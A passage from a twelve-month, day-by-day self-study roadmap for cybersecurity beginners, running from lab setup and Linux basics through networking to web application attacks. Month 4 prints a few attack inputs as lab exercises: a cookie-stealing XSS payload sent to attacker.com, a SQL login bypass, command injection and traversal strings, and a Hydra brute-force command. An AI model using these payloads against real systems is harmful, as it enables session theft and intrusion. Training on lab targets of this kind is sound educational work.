# Complete Beginner to Job-Ready (2025-2026)

---

## HOW TO USE THIS ROADMAP

This roadmap is designed for complete beginners who want to build practical cybersecurity skills systematically. **Follow it sequentially**—each month builds on the previous one. Do NOT skip around.

### Anti-Paralysis Rules:

- **If you don't know what to do today**: Go to the current month and start with Day 1 of Week 1
- **If you're stuck on a topic for more than 3 days**: Skip it, mark it for later review, and move to the next day's task
- **If multiple resources are available**: Use the first one listed (they're in priority order)
- **Am I ready for next month?** If you've completed 70% of the daily tasks and understand the core concepts, move forward

### Time Commitment:

- **Weekdays**: 2-3 hours per day minimum
- **Weekends**: 4-6 hours per day for practice and review

---

## 12-MONTH OVERVIEW

|Month|Focus Area|Key Outcomes|
|---|---|---|
|**1**|IT Fundamentals & Setup|Build VM lab, understand how computers/networks work|
|**2**|Linux Mastery|Navigate Linux like a pro, bash scripting, file permissions|
|**3**|Networking Deep Dive|TCP/IP, DNS, HTTP, Wireshark packet analysis|
|**4**|Web Application Security|OWASP Top 10, SQLi, XSS, CSRF attacks and defenses|
|**5**|Reconnaissance & Enumeration|Nmap, directory busting, subdomain enumeration, OSINT|
|**6**|Exploitation Basics|Metasploit, searchsploit, manual exploitation, privilege escalation|
|**7**|Active Directory Attacks|Kerberos, LLMNR poisoning, BloodHound, lateral movement|
|**8**|CTF Intensive Training|Complete 30+ machines, develop methodology, write-ups|
|**9**|Advanced Topics & Lab Building|Buffer overflows, advanced pivoting, custom home lab|
|**10**|Specialization Path Choice|Pick: Offensive, Defensive, Cloud, or AppSec track|
|**11**|Certification Preparation|Study for eJPT, Security+, or PNPT exam|
|**12**|Portfolio & Job Prep|Build GitHub portfolio, resume, apply for jobs|

---

# PHASE 1: FOUNDATIONS (Months 1-3)

---

## MONTH 1: IT Fundamentals & Lab Setup

### Objectives:

- Set up a functional home lab with VirtualBox/VMware
- Understand how computers and operating systems work
- Learn basic networking concepts (IP addresses, ports, protocols)
- Install Kali Linux and understand its purpose

---

### WEEK 1: Computer Hardware & OS Basics

#### Day 1: Understanding Computer Components

- **Watch**: Professor Messer's "Computer Hardware" playlist (Episodes 1-3) on YouTube
- **Read**: CompTIA A+ Exam Objectives 1.1-1.3 (free PDF from CompTIA website)
- **Practice**: Draw a diagram of computer components (CPU, RAM, storage, motherboard) and their connections
- **Goal**: Understand how hardware components interact

#### Day 2: Operating System Fundamentals

- **Watch**: "Operating Systems Explained" by PowerCert Animated Videos (YouTube)
- **Read**: Windows vs Linux architecture comparison (TechTarget articles)
- **Install**: VirtualBox or VMware Workstation Player (both free)
- **Practice**: Create your first VM with Windows 10/11 trial ISO
- **Goal**: Successfully run a VM

#### Day 3: Setting Up Your Lab Environment

- **Watch**: NetworkChuck's "Build a Hacking Lab" video on YouTube
- **Download**: Kali Linux 2024+ ISO from official website
- **Install**: Kali Linux in VirtualBox (allocate 4GB RAM, 40GB disk)
- **Practice**: Take snapshots of clean VM states (crucial skill)
- **Goal**: Working Kali Linux VM

#### Day 4: Basic Networking Concepts

- **Watch**: NetworkChuck's "IP Addresses and Subnetting" video
- **Read**: What are IP addresses, subnet masks, default gateways
- **Practice**: Run `ipconfig` (Windows) or `ip addr` (Linux), identify your IP, subnet, gateway
- **Practice**: Ping google.com and 8.8.8.8, understand the difference
- **Goal**: Understand basic network addressing

#### Day 5: Introduction to Command Line

- **Watch**: "Windows Command Line Basics" by Joe Collins (YouTube)
- **Practice on Windows**: cd, dir, mkdir, del, copy, type, cls commands
- **Practice on Kali**: pwd, ls, mkdir, rm, cp, cat, clear commands
- **Document**: Create a cheat sheet of 20 commands used today
- **Goal**: Comfortable with basic terminal commands

#### Weekend Project:

- Build 2-3 VMs: Windows, Kali Linux, and Ubuntu Server
- Configure networking: ensure all VMs can ping each other
- Take clean snapshots of all VMs for future reversion

---

### WEEK 2: Networking Fundamentals

#### Day 1: OSI Model & TCP/IP

- **Watch**: Practical TLS's "OSI Model Explained" video
- **Read**: Each layer of OSI model with real-world examples (NetworkLessons.com)
- **Practice**: Draw OSI model, label protocols at each layer (HTTP, TCP, IP, Ethernet)
- **Goal**: Explain OSI model from memory

#### Day 2: Ports and Protocols

- **Watch**: PowerCert's "Common Network Ports" video
- **Memorize**: Common ports - 21 (FTP), 22 (SSH), 23 (Telnet), 25 (SMTP), 53 (DNS), 80 (HTTP), 443 (HTTPS), 3389 (RDP)
- **Practice**: Use `netstat -ano` to see active connections and their ports
- **Goal**: Know 20+ common ports by heart

#### Day 3: DNS Basics

- **Watch**: Computerphile's "How DNS Works" video
- **Practice**: Use `nslookup google.com` and `nslookup 8.8.8.8`
- **Practice**: Use `dig` command in Kali to query DNS records (A, AAAA, MX, TXT, NS)
- **Document**: Explain DNS resolution process in your own words
- **Goal**: Understand DNS hierarchy and resolution

#### Day 4: HTTP/HTTPS Deep Dive

- **Watch**: Traversy Media's "HTTP Crash Course"
- **Read**: HTTP request methods (GET, POST, PUT, DELETE), status codes (200, 404, 500, 401, 403)
- **Install**: Browser developer tools (F12), inspect network traffic
- **Practice**: Capture HTTP requests and responses using browser DevTools
- **Goal**: Understand HTTP communication

#### Day 5: Wireshark Introduction

- **Install**: Wireshark on Kali Linux (pre-installed) or Windows
- **Watch**: NetworkChuck's "Wireshark Tutorial for Beginners"
- **Practice**: Capture packets while browsing, filter by HTTP, examine GET/POST requests
- **Practice**: Filter traffic by IP, protocol (tcp.port==80), follow TCP stream
- **Goal**: Capture and analyze basic network traffic

#### Weekend Project:

- Complete TryHackMe's "Networking" room (free)
- Capture and analyze 100+ packets using Wireshark
- Write summary: Key networking concepts learned this week

---

### WEEK 3: Web Technologies Basics

#### Day 1: HTML & CSS Fundamentals

- **Watch**: freeCodeCamp's "HTML Full Course" (first 2 hours)
- **Practice**: Build a simple HTML page with headings, paragraphs, lists, links, images
- **Add**: Basic CSS styling (colors, fonts, margins, padding)
- **Understand**: View page source, inspect element in browser
- **Goal**: Create a basic web page

#### Day 2: JavaScript Basics

- **Watch**: Programming with Mosh's "JavaScript Tutorial for Beginners" (first hour)
- **Learn**: Variables, functions, arrays, objects, basic DOM manipulation
- **Practice**: Add interactive button to your HTML page that changes text
- **Understand**: Browser console, console.log() for debugging
- **Goal**: Add interactivity to web pages

#### Day 3: How Websites Work

- **Complete**: TryHackMe's "How Websites Work" room (free)
- **Learn**: Client-server model, cookies, sessions, authentication
- **Practice**: Examine cookies in browser DevTools, understand session tokens
- **Goal**: Understand web application architecture

#### Day 4: Burp Suite Introduction

- **Install**: Burp Suite Community Edition on Kali
- **Watch**: Rana Khalil's "Burp Suite Tutorial for Beginners"
- **Setup**: Configure browser to use Burp as proxy (127.0.0.1:8080)
- **Practice**: Intercept requests, modify parameters, forward request
- **Goal**: Intercept and modify web traffic

#### Day 5: Basic Web Server Setup

- **Install**: Apache web server on Ubuntu VM (`sudo apt install apache2`)
- **Practice**: Host your HTML page, access it from Kali VM
- **Learn**: /var/www/html directory, apache2.conf, access logs
- **Practice**: View Apache access logs, understand log entries
- **Goal**: Run your own web server

#### Weekend Project:

- Build a simple multi-page website with navigation
- Host it on your Apache server
- Practice intercepting and modifying requests with Burp Suite

---

### WEEK 4: Security Fundamentals & Month 1 Review

#### Day 1: CIA Triad & Security Principles

- **Watch**: Professor Messer's "Security Fundamentals" series
- **Learn**: Confidentiality, Integrity, Availability (CIA Triad)
- **Learn**: Authentication, Authorization, Accounting (AAA)
- **Document**: Real-world examples of each principle
- **Goal**: Understand core security concepts

#### Day 2: Common Attack Types Overview

- **Read**: OWASP Top 10 overview (don't memorize yet)
- **Watch**: Brief videos on phishing, malware, DDoS, social engineering
- **Practice**: Identify attack types from news articles about breaches
- **Goal**: General awareness of threat landscape

#### Day 3: Password Security & Hashing

- **Watch**: Computerphile's "How NOT to Store Passwords"
- **Learn**: Difference between encoding, encryption, hashing
- **Practice**: Use online MD5/SHA256 hash generators
- **Tool**: Install John the Ripper, crack simple MD5 hashes
- **Goal**: Understand password storage mechanisms

#### Day 4: Introduction to Ethical Hacking

- **Watch**: NetworkChuck's "What is Ethical Hacking?"
- **Read**: Laws and ethics - CFAA, computer misuse act, responsible disclosure
- **Understand**: Legal vs illegal hacking, importance of authorization
- **Sign up**: TryHackMe account (free tier)
- **Goal**: Understand legal boundaries

#### Day 5: Month 1 Review & Assessment

- **Complete**: TryHackMe's "Pre Security" learning path (free)
- **Review**: All commands learned, network concepts, web fundamentals
- **Self-test**: Can you explain OSI model? Set up a VM? Use Wireshark?
- **Document**: Create Month 1 summary with key learnings
- **Goal**: Consolidate knowledge

#### Weekend Project:

- Complete TryHackMe's "Complete Beginner" path (Rooms 1-5)
- Organize all notes, cheat sheets, screenshots from Month 1
- Set goals for Month 2

### Month 1 Completion Criteria:

✓ Can set up and manage multiple VMs  
✓ Understand OSI model and common protocols  
✓ Can use Wireshark to capture and analyze basic network traffic  
✓ Understand how web applications work (client-server, HTTP)  
✓ Completed TryHackMe Pre Security path

---

## MONTH 2: Linux Mastery

### Objectives:

- Master Linux command line navigation and file management
- Understand Linux file permissions and user management
- Learn bash scripting basics
- Become proficient in text manipulation and processing

---

### WEEK 1: Linux File System & Navigation

#### Day 1: File System Structure

- **Complete**: OverTheWire Bandit Level 0-2
- **Learn**: pwd, ls, cd commands and Linux directory hierarchy
- **Watch**: "Linux File System Explained" by LearnLinuxTV
- **Practice**: Navigate to /etc, /var/log, /tmp using absolute and relative paths
- **Goal**: Understand Linux directory structure

#### Day 2: File Permissions Basics

- **Complete**: Bandit Level 3-5
- **Learn**: chmod, chown, chgrp commands
- **Understand**: rwx permissions, numeric (755) vs symbolic (u+x) notation
- **Practice**: Create files with different permissions, test access
- **Goal**: Control file access

#### Day 3: File Searching & Manipulation

- **Complete**: Bandit Level 6-8
- **Master**: find command with -name, -type, -size, -user flags
- **Learn**: grep command for pattern matching
- **Practice**: Find all .txt files in /etc, files owned by specific user
- **Goal**: Locate files efficiently

#### Day 4: Text Processing

- **Complete**: Bandit Level 9-11
- **Master**: cat, less, head, tail, more commands
- **Learn**: Piping (|) and redirection (>, >>)
- **Practice**: Extract last 20 lines of /var/log/syslog, grep for 'error'
- **Goal**: Manipulate text output

#### Day 5: Practice & Consolidation

- **Complete**: Bandit Level 12-14
- **Challenge**: Find all SUID files on system
- **Document**: Create comprehensive command cheat sheet
- **Goal**: Confidence in file navigation

#### Weekend Project:

- Complete Bandit levels 0-15
- Create personal Linux command reference
- Set up automated backups using cron

---

### WEEK 2: Users, Groups & Processes

#### Day 1: User & Group Management

- **Learn**: useradd, usermod, userdel, groupadd, passwd commands
- **Understand**: /etc/passwd, /etc/shadow, /etc/group files
- **Practice**: Create 3 users, add to groups, test file access
- **Watch**: "Linux Users and Groups" by Learn Linux TV
- **Goal**: Manage system users

#### Day 2: Sudo & Privilege Management

- **Learn**: sudo command, visudo, /etc/sudoers file
- **Understand**: Principle of least privilege
- **Practice**: Configure sudo access for a user
- **Complete**: TryHackMe's "Linux Fundamentals Part 2" room
- **Goal**: Understand privilege escalation basics

#### Day 3: Process Management

- **Master**: ps, top, htop, kill, killall, pkill commands
- **Learn**: Process states, parent-child relationships, signals
- **Practice**: Start background processes (&), fg, bg commands
- **Practice**: Find and kill processes by name, PID
- **Goal**: Control running processes

#### Day 4: System Logs & Monitoring

- **Learn**: /var/log directory, syslog, auth.log, dmesg
- **Master**: journalctl for systemd logs
- **Practice**: Search logs for failed SSH attempts, sudo usage
- **Practice**: Use `tail -f` to monitor logs in real-time
- **Goal**: Investigate system activity

#### Day 5: Services & Systemd

- **Learn**: systemctl start/stop/restart/status, enable/disable
- **Understand**: systemd units, service files
- **Practice**: Start SSH service, check status, enable on boot
- **Practice**: Create simple systemd service for a bash script
- **Goal**: Manage system services

#### Weekend Project:

- Complete TryHackMe's "Linux Fundamentals Part 3"
- Build monitoring script that alerts on high CPU usage
- Document all new commands learned

---

### WEEK 3: Advanced Text Processing & Scripting

#### Day 1: Advanced Text Tools

- **Master**: sed, awk, cut, sort, uniq, wc commands
- **Watch**: "awk and sed tutorial" by NetworkChuck
- **Practice**: Extract IP addresses from Apache logs using awk
- **Practice**: Replace text in files using sed
- **Goal**: Powerful text manipulation

#### Day 2: Regular Expressions

- **Learn**: Regex basics - ., *, +, ?, ^, $, [], () metacharacters
- **Practice**: regex101.com for interactive testing
- **Practice**: Use grep with regex to find emails, IPs in files
- **Complete**: RegexOne interactive tutorial
- **Goal**: Pattern matching mastery

#### Day 3: Bash Scripting Basics

- **Learn**: Shebang (#!/bin/bash), variables, command substitution
- **Watch**: "Bash Scripting Tutorial for Beginners" by freeCodeCamp (first 2 hours)
- **Practice**: Write script to backup /home with timestamp
- **Practice**: Make script executable (chmod +x), run it
- **Goal**: Create basic automation scripts

#### Day 4: Control Structures in Bash

- **Learn**: if/else statements, for loops, while loops, case statements
- **Practice**: Script that checks if service is running, restarts if down
- **Practice**: Loop through .log files, count 'error' occurrences
- **Practice**: Accept user input, validate, perform action
- **Goal**: Write complex scripts

#### Day 5: Practical Scripting

- **Project**: Write port scanner in bash (loop through ports with nc)
- **Project**: Parse Apache logs, identify top 10 IP addresses
- **Project**: Automated user creation script (read from CSV)
- **Upload**: Scripts to GitHub repository
- **Goal**: Build portfolio pieces

#### Weekend Project:

- Create 5 useful scripts for system administration
- Complete 10 bash scripting challenges on HackerRank
- Document scripts with comments and README

---

### WEEK 4: Networking Tools & Month 2 Review

#### Day 1: Network Utilities

- **Master**: netstat, ss, ip, ifconfig, route commands
- **Learn**: netcat (nc) for manual connections, file transfers
- **Practice**: Set up reverse shell using nc (between VMs)
- **Practice**: Transfer files between VMs using nc
- **Goal**: Network troubleshooting skills

#### Day 2: SSH Deep Dive

- **Master**: SSH keys, ssh-keygen, ssh-copy-id, authorized_keys
- **Learn**: SSH tunneling (local/remote port forwarding), SOCKS proxy
- **Practice**: Set up passwordless SSH between VMs
- **Practice**: Create SSH tunnel to access web server on private network
- **Goal**: Advanced SSH usage

#### Day 3: Package Management

- **Master**: apt/apt-get (Debian/Ubuntu), yum/dnf (RHEL/CentOS)
- **Learn**: pip (Python), gem (Ruby), npm (Node.js)
- **Practice**: Install security tools - nmap, nikto, sqlmap, gobuster
- **Practice**: Update system, clean cache, remove unused packages
- **Goal**: Software installation mastery

#### Day 4: File Transfers & Archives

- **Master**: tar, gzip, bzip2, zip/unzip commands
- **Learn**: scp, rsync for file transfers
- **Practice**: Compress directories, transfer using scp
- **Complete**: Bandit Level 15-20
- **Goal**: Data transfer proficiency

#### Day 5: Month 2 Review

- **Complete**: All Bandit levels up to 20
- **Review**: All bash scripts written, update GitHub
- **Self-test**: Can you navigate Linux blindfolded? Write 50+ line script?
- **Document**: Month 2 accomplishments
- **Goal**: Solid Linux foundation

#### Weekend Project:

- Build comprehensive Linux automation toolkit
- Complete advanced TryHackMe Linux rooms
- Prepare for Month 3 networking focus

### Month 2 Completion Criteria:

✓ Comfortable with Linux command line (90% work in terminal)  
✓ Can write functional bash scripts with loops and conditionals  
✓ Understand file permissions and user management  
✓ Completed Bandit levels 0-20  
✓ Have 5+ scripts in GitHub repository

---

## MONTH 3: Networking Deep Dive

### Objectives:

- Master TCP/IP stack in depth
- Learn packet analysis with Wireshark
- Understand network protocols (DNS, DHCP, ARP, ICMP)
- Introduction to network scanning with Nmap

---

### WEEK 1: TCP/IP Protocol Suite

#### Day 1: IP Addressing & Subnetting

- **Watch**: "Subnetting Mastery" by NetworkChuck (full video)
- **Learn**: CIDR notation, subnet masks, network/broadcast addresses
- **Practice**: subnettingpractice.com - complete 50 problems
- **Practice**: Calculate subnets for 192.168.1.0/24, 10.0.0.0/16
- **Goal**: Master subnetting calculations

#### Day 2: TCP Three-Way Handshake

- **Watch**: Practical Networking's "TCP Three-Way Handshake Explained"
- **Learn**: SYN, SYN-ACK, ACK packets, TCP flags, sequence numbers
- **Practice**: Capture TCP handshake in Wireshark, analyze each packet
- **Learn**: TCP vs UDP differences
- **Goal**: Understand TCP connection establishment

#### Day 3: Advanced Wireshark

- **Complete**: TryHackMe "Wireshark 101" room
- **Master**: Display filters (ip.addr==, tcp.port==, http.request.method==)
- **Practice**: Extract files from HTTP traffic, follow TCP streams
- **Practice**: Analyze PCAP from malware-traffic-analysis.net
- **Goal**: Advanced packet analysis

#### Day 4: ARP & ICMP Protocols

- **Learn**: How ARP resolves IP to MAC, ARP cache
- **Learn**: ICMP types (ping, traceroute), echo request/reply
- **Practice**: `arp -a` to view cache, arping to test
- **Understand**: ARP spoofing concept (theory)
- **Goal**: Understand Layer 2 communications

#### Day 5: Routing Fundamentals

- **Watch**: "How Routing Works" by PowerCert
- **Learn**: Routing tables, default gateways, static vs dynamic
- **Practice**: View routing table (`route -n` or `ip route`)
- **Practice**: Traceroute to google.com, understand hops
- **Goal**: Understand packet routing

#### Weekend Project:

- Set up multi-subnet lab environment
- Practice packet capture and analysis on each subnet
- Create network diagram of your lab

---

### WEEK 2: Application Layer Protocols

#### Day 1: DNS Deep Dive

- **Complete**: TryHackMe "DNS in Detail" room
- **Learn**: DNS record types (A, AAAA, CNAME, MX, TXT, NS, PTR)
- **Practice**: Use dig to query each record type
- **Practice**: Perform zone transfer attempt (dig axfr)
- **Goal**: DNS enumeration techniques

#### Day 2: HTTP/HTTPS in Detail

- **Learn**: HTTP headers, cookies, authentication mechanisms
- **Learn**: SSL/TLS handshake process, certificates
- **Practice**: Examine HTTPS traffic in Wireshark
- **Practice**: View SSL certificate details in browser
- **Goal**: Understand secure communications

#### Day 3: FTP, SSH, SMB Protocols

- **Learn**: How FTP works (active vs passive mode)
- **Learn**: SSH protocol, key exchange process
- **Learn**: SMB/CIFS for Windows file sharing
- **Practice**: Set up FTP server, connect from Kali
- **Practice**: Capture and analyze each protocol in Wireshark
- **Goal**: Understand file transfer protocols

#### Day 4: Email Protocols (SMTP, POP3, IMAP)

- **Learn**: How email delivery works (MTA, MUA, MDA)
- **Learn**: SMTP commands, POP3 vs IMAP
- **Practice**: Manually send email using telnet to port 25
- **Practice**: Analyze email headers for routing information
- **Goal**: Understand email infrastructure

#### Day 5: DHCP & Network Services

- **Learn**: DHCP DORA process (Discover, Offer, Request, Acknowledge)
- **Learn**: DHCP lease times, reservations, scopes
- **Practice**: Set up DHCP server in lab
- **Practice**: Capture DHCP traffic in Wireshark
- **Goal**: Automated network configuration understanding

#### Weekend Project:

- Build complete network services lab (DNS, DHCP, Web, FTP, SSH)
- Document all protocols learned with packet captures
- Create protocol reference guide

---

### WEEK 3: Network Scanning with Nmap

#### Day 1: Nmap Basics

- **Watch**: NetworkChuck's "Nmap Tutorial"
- **Learn**: Nmap scan types (-sT, -sS, -sU, -sA)
- **Practice**: Scan your lab VMs with different scan types
- **Practice**: `nmap -p- <target>` for full port scan
- **Goal**: Basic network reconnaissance

#### Day 2: Advanced Nmap Techniques

- **Learn**: NSE scripts, service version detection (-sV)
- **Learn**: OS detection (-O), aggressive scan (-A)
- **Practice**: `nmap --script vuln <target>` for vulnerability scanning
- **Practice**: Output results to file (-oN, -oX, -oG)
- **Goal**: Comprehensive host enumeration

#### Day 3: Timing and Stealth

- **Learn**: Nmap timing templates (-T0 to -T5)
- **Learn**: Firewall evasion techniques (fragmentation, decoys)
- **Practice**: Slow scan to avoid detection (`-T1`)
- **Practice**: Scan using decoys (`-D`)
- **Goal**: Covert scanning techniques

#### Day 4: Network Mapping

- **Learn**: Ping sweeps, CIDR notation scanning
- **Practice**: Discover all live hosts on subnet (`nmap -sn 192.168.1.0/24`)
- **Practice**: Create network topology map
- **Tool**: Try Zenmap (Nmap GUI) for visualization
- **Goal**: Network discovery

#### Day 5: Nmap Scripting Engine (NSE)

- **Learn**: NSE categories (auth, brute, discovery, exploit, vuln)
- **Practice**: `nmap --script-help <script-name>`
- **Practice**: Run specific scripts against targets
- **Create**: Custom NSE script (simple)
- **Goal**: Automated vulnerability detection

#### Weekend Project:

- Scan your entire lab network, document all findings
- Complete TryHackMe "Nmap" room
- Create Nmap cheat sheet with common commands

---

### WEEK 4: Wireless & Month 3 Review

#### Day 1: Wireless Networking Basics

- **Learn**: 802.11 standards (a/b/g/n/ac/ax), frequencies
- **Learn**: WEP, WPA, WPA2, WPA3 security
- **Watch**: "WiFi Hacking for Beginners" by NetworkChuck
- **Practice**: Identify wireless networks (if you have WiFi adapter)
- **Goal**: Understand wireless fundamentals

#### Day 2: Network Troubleshooting

- **Learn**: Common network issues and solutions
- **Practice**: Use ping, traceroute, nslookup, dig for diagnosis
- **Practice**: Analyze slow network with Wireshark
- **Create**: Network troubleshooting flowchart
- **Goal**: Diagnose network problems

#### Day 3: VPNs and Tunneling

- **Learn**: How VPNs work (IPSec, OpenVPN, WireGuard)
- **Learn**: Tunneling protocols (GRE, L2TP)
- **Practice**: Set up OpenVPN server and client
- **Practice**: Analyze VPN traffic in Wireshark
- **Goal**: Understand secure remote access

#### Day 4: Network Security Devices

- **Learn**: Firewalls, IDS/IPS, proxies, load balancers
- **Learn**: DMZ concepts, network segmentation
- **Watch**: Videos on pfSense firewall configuration
- **Practice**: Set up basic firewall rules in iptables
- **Goal**: Network security architecture

#### Day 5: Month 3 Review

- **Complete**: TryHackMe "Networking" path
- **Review**: All protocols, Nmap techniques, Wireshark skills
- **Self-test**: Can you explain TCP/IP stack? Scan a network? Analyze packets?
- **Document**: Month 3 achievements
- **Goal**: Strong networking foundation

#### Weekend Project:

- Build complex multi-subnet network in lab
- Perform complete network assessment of your lab
- Write detailed network analysis report

### Month 3 Completion Criteria:

✓ Can explain TCP/IP stack and common protocols in detail  
✓ Proficient in Wireshark packet analysis  
✓ Can use Nmap for comprehensive network reconnaissance  
✓ Understand network security concepts  
✓ Completed TryHackMe Networking path

---

# PHASE 2: CORE SECURITY CONCEPTS (Months 4-6)

---

## MONTH 4: Web Application Security

### Objectives:

- Master OWASP Top 10 vulnerabilities
- Learn SQL injection attacks and prevention
- Understand XSS, CSRF, and session attacks
- Practice on intentionally vulnerable web applications

---

### WEEK 1: OWASP Top 10 Foundation

#### Day 1: Injection Flaws Overview

- **Complete**: TryHackMe "OWASP Top 10" room
- **Learn**: SQL injection, command injection, LDAP injection
- **Watch**: "SQL Injection Explained" by Computerphile
- **Practice**: PortSwigger Web Security Academy - SQL injection labs (beginner)
- **Goal**: Understand injection attack vectors

#### Day 2: SQL Injection - Basic

- **Learn**: SQL query structure, WHERE clauses, UNION statements
- **Practice**: SQLi on DVWA (Damn Vulnerable Web App) - low security
- **Practice**: Bypass login forms using `' OR '1'='1`
- **Tool**: Learn sqlmap basics (`sqlmap -u <URL> --dbs`)
- **Goal**: Exploit basic SQL injection

#### Day 3: SQL Injection - Advanced

- **Learn**: Blind SQLi, time-based SQLi, error-based SQLi
- **Practice**: Extract database names, table names, column names
- **Practice**: Dump user credentials from database
- **Complete**: PortSwigger SQL injection labs (intermediate)
- **Goal**: Advanced SQLi techniques

#### Day 4: Command Injection

- **Learn**: OS command injection vulnerabilities
- **Practice**: Inject commands through web forms (;ls, && whoami, | cat /etc/passwd)
- **Practice**: DVWA command injection challenges
- **Tool**: Use Burp Suite to modify requests
- **Goal**: Execute arbitrary OS commands

#### Day 5: XML/XXE Injection

- **Learn**: XML External Entity (XXE) attacks
- **Practice**: Read local files via XXE injection
- **Practice**: PortSwigger XXE labs
- **Understand**: Prevention methods (disable external entities)
- **Goal**: Exploit XML parsers

#### Weekend Project:

- Complete all DVWA injection challenges (all security levels)
- Write CTF write-up for one SQL injection challenge
- Create injection attack cheat sheet

---

### WEEK 2: Cross-Site Scripting (XSS)

#### Day 1: XSS Fundamentals

- **Learn**: Reflected, Stored, DOM-based XSS
- **Watch**: "Cross-Site Scripting Explained" by PwnFunction
- **Practice**: Inject simple alert() payloads
- **Practice**: DVWA XSS (Reflected) challenges
- **Goal**: Understand XSS attack flow

#### Day 2: Stored XSS

- **Learn**: Persistent XSS attacks, impact on all users
- **Practice**: Inject XSS into database via forms
- **Practice**: Steal cookies using XSS (`<script>document.location='http://attacker.com/?c='+document.cookie</script>`)
- **Complete**: PortSwigger stored XSS labs
- **Goal**: Exploit stored XSS vulnerabilities

#### Day 3: DOM-based XSS

- **Learn**: JavaScript DOM manipulation vulnerabilities
- **Practice**: Exploit client-side XSS via URL parameters
- **Practice**: PortSwigger DOM XSS labs
- **Tool**: Use browser developer console for testing
- **Goal**: Client-side XSS exploitation

#### Day 4: XSS Bypass Techniques

- **Learn**: Filter evasion, encoding tricks
- **Practice**: Bypass WAF filters using different payloads
- **Resource**: PayloadsAllTheThings XSS bypass cheat sheet
- **Practice**: OWASP WebGoat XSS challenges
- **Goal**: Advanced XSS payloads

#### Day 5: XSS to Account Takeover

- **Practice**: Cookie stealing, session hijacking
- **Practice**: Keylogging via XSS
- **Tool**: XSS Hunter for blind XSS detection
- **Project**: Write XSS exploitation report
- **Goal**: Demonstrate real-world XSS impact

#### Weekend Project:

- Complete all DVWA XSS challenges
- Find and exploit XSS on intentionally vulnerable apps
- Build XSS payload collection

---

### WEEK 3: Authentication & Session Management

#### Day 1: Authentication Bypass

- **Learn**: Weak passwords, default credentials, brute forcing
- **Practice**: Brute force login with Hydra (`hydra -l admin -P /path/to/wordlist.txt http-post-form`)
- **Practice**: DVWA brute force challenge
- **Complete**: TryHackMe "Authentication Bypass" room
- **Goal**: Exploit weak authentication

#### Day 2: Session Hijacking

- **Learn**: How session cookies work, session fixation
- **Practice**: Steal session cookies via XSS
- **Practice**: Session prediction attacks
- **Tool**: Burp Suite session handling
- **Goal**: Take over user sessions

#### Day 3: CSRF Attacks

- **Learn**: Cross-Site Request Forgery principles
- **Watch**: "CSRF Explained" by PwnFunction
- **Practice**: Create malicious HTML page that triggers CSRF
- **Practice**: DVWA CSRF challenge
- **Goal**: Exploit CSRF vulnerabilities

#### Day 4: Password Attacks

- **Learn**: Rainbow tables, hash cracking
- **Tool**: John the Ripper for password cracking
- **Tool**: Hashcat for GPU-accelerated cracking
- **Practice**: Crack MD5, SHA1, SHA256 hashes
- **Goal**: Offline password attacks

#### Day 5: JWT Vulnerabilities

- **Learn**: JSON Web Tokens structure (header, payload, signature)
- **Practice**: Decode JWT tokens (jwt.io)
- **Practice**: Exploit weak JWT secrets
- **Complete**: PortSwigger JWT labs
- **Goal**: Token manipulation attacks

#### Weekend Project:

- Complete TryHackMe "Web Fundamentals" path
- Crack 100 password hashes using various techniques
- Document authentication attack vectors

---

### WEEK 4: File Upload & Inclusion Vulnerabilities

#### Day 1: Unrestricted File Upload

- **Learn**: Malicious file upload risks
- **Practice**: Upload PHP web shell to DVWA
- **Practice**: Bypass file type restrictions (MIME type, extension)
- **Tool**: Create simple PHP reverse shell
- **Goal**: Exploit file upload vulnerabilities

#### Day 2: Local File Inclusion (LFI)

- **Learn**: LFI attack vectors, directory traversal
- **Practice**: Read /etc/passwd via LFI (../../../etc/passwd)
- **Practice**: DVWA File Inclusion challenge
- **Practice**: LFI to RCE using log poisoning
- **Goal**: Exploit LFI vulnerabilities

#### Day 3: Remote File Inclusion (RFI)

- **Learn**: RFI vs LFI differences
- **Practice**: Include remote malicious files
- **Practice**: Host malicious file, include via RFI
- **Complete**: PortSwigger file path traversal labs
- **Goal**: Leverage RFI for code execution

#### Day 4: Directory Traversal

- **Learn**: Path traversal attacks
- **Practice**: Access files outside web root
- **Practice**: Use Burp Suite to fuzz file paths
- **Tool**: DotDotPwn for automated testing
- **Goal**: Navigate file system via web app

#### Day 5: Month 4 Review

- **Complete**: OWASP WebGoat (at least 50%)
- **Complete**: OWASP Juice Shop challenges
- **Review**: All web vulnerabilities learned
- **Self-test**: Can you exploit OWASP Top 10?
- **Goal**: Strong web app security foundation

#### Weekend Project:

- Complete Pentester Lab "Web for Pentester" exercises
- Exploit multiple vulnerabilities in single web app
- Write comprehensive penetration test report

### Month 4 Completion Criteria:

✓ Can identify and exploit OWASP Top 10 vulnerabilities  
✓ Proficient in SQL injection (manual and automated)  
✓ Can exploit XSS in various contexts  
✓ Understand authentication and session vulnerabilities  
✓ Completed multiple intentionally vulnerable web apps

---

## MONTH 5: Reconnaissance & Enumeration

### Objectives:

- Master information gathering techniques
- Learn subdomain enumeration and DNS recon
- Directory and file brute forcing
- OSINT (Open Source Intelligence) methods

---

### WEEK 1: Passive Reconnaissance

#### Day 1: OSINT Fundamentals

- **Complete**: TryHackMe "Google Dorking" room
- **Learn**: Advanced Google search operators (site:, filetype:, inurl:, intitle:)
- **Practice**: Find exposed files, directories, credentials using dorks
- **Resource**: Google Hacking Database (GHDB)
- **Goal**: Information gathering via search engines

#### Day 2: Subdomain Enumeration

- **Tool**: Sublist3r, Amass, subfinder
- **Practice**: Enumerate subdomains for popular websites
- **Learn**: DNS brute forcing vs passive enumeration
- **Practice**: `amass enum -d example.com`
- **Goal**: Discover hidden subdomains

#### Day 3: DNS Reconnaissance

- **Tool**: dnsrecon, dnsenum, fierce
- **Practice**: DNS zone transfer attempts
- **Practice**: Reverse DNS lookups
- **Practice**: `dig` for comprehensive DNS queries
- **Goal**: Extract maximum DNS information

#### Day 4: WHOIS & IP Information

- **Learn**: WHOIS data (registrant, nameservers, creation date)
- **Tool**: whois command, online WHOIS services
- **Practice**: IP geolocation, ASN lookups
- **Tool**: Shodan for internet-connected device discovery
- **Goal**: Target infrastructure mapping

#### Day 5: Social Media OSINT

- **Learn**: Social media intelligence gathering
- **Tool**: Sherlock (username enumeration across platforms)
- **Tool**: theHarvester (email, subdomain, people discovery)
- **Practice**: Build dossier on fictional target
- **Goal**: Human intelligence gathering

#### Weekend Project:

- Complete full OSINT investigation on domain
- Use OSINT Framework website for tool discovery
- Document reconnaissance methodology

---

### WEEK 2: Active Enumeration

#### Day 1: Port Scanning Deep Dive

- **Review**: Nmap advanced techniques
- **Learn**: Masscan for fast scanning
- **Practice**: Compare Nmap vs Masscan speed and results
